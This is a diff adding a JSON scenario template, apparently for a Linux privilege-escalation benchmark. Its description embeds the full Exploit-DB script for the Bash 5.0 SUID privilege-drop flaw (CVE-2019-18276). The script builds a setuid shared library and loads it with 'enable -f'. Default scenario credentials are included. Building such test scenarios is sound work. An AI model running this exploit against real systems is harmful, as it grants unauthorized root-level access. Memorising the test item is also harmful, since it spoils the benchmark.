@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47726",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Bash 5.0 Patch 11 - SUID Priv Drop Exploit\n\nExploit source code (47726.sh):\n```\n# Exploit Title : Bash 5.0 Patch 11 -  SUID Priv Drop Exploit\n# Date : 2019-11-29\n# Original Author: Ian Pudney , Chet Ramey\n# Exploit Author : Mohin Paramasivam (Shad0wQu35t)\n# Version : < Bash 5.0 Patch 11\n# Tested on Linux\n# Credit : Ian Pudney from Google Security and Privacy Team based on Google CTF suidbash\n# CVE : 2019-18276\n# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2019-18276 , https://www.youtube.com/watch?v=-wGtxJ8opa8\n# Exploit Demo POC : https://youtu.be/Dbwvzbb38W0\n\nDescription :\n\nAn issue was discovered in disable_priv_mode in shell.c in GNU Bash through 5.0 patch 11.\nBy default, if Bash is run with its effective UID not equal to its real UID,\nit will drop privileges by setting its effective UID to its real UID.\nHowever, it does so incorrectly. On Linux and other systems that support \"saved UID\" functionality,\nthe saved UID is not dropped. An attacker with command execution in the shell can use \"enable -f\" for\nruntime loading of a new builtin, which can be a shared object that calls setuid() and therefore\nregains privileges. However, binaries running with an effective UID of 0 are unaffected.\n\n#!/bin/bash\n#Terminal Color Codes\n\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nNC='\\033[0m'\n\n#Get the Effective User ID (owner of the SUID /bin/bash binary)\nread -p \"Please enter effective user id (euid) : \" euid\n#Create a C file and output the exploit code\ntouch pwn.c\necho \"\" > pwn.c\ncat <<EOT >> pwn.c\n\n#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\n\nvoid __attribute((constructor)) initLibrary(void) {\n        printf(\"Escape lib is initialized\");\n        printf(\"[LO] uid:%d | euid:%d%c\", getuid(), geteuid());\n        setuid($euid);\n        printf(\"[LO] uid%d | euid:%d%c\", getuid(), geteuid());\n}\n\nEOT\necho -e  \"${RED}\"\necho -e \"Exploit Code copied to pwn.c !\\n\"\nsleep 5\necho -e \"Compiling Exploit Object ! \\n\"\n$(which gcc ) -c -fPIC pwn.c -o pwn.o\nsleep 5\necho -e \"Compiling Exploit Shared Object ! \\n\"\n$(which gcc ) -shared -fPIC pwn.o -o libpwn.so\nsleep 5\necho -e \"Exploit Compiled ! \\n\"\nsleep 5\necho -e \"Executing Exploit :)  \\n\"\nsleep 5\n#Execute the Shared Library\necho -e \"${RED}Run  : ${NC} enable -f ./libpwn.so asd \\n\"\n```",
+  "cve": "",
+  "exploitdb_id": "47726",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47726",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
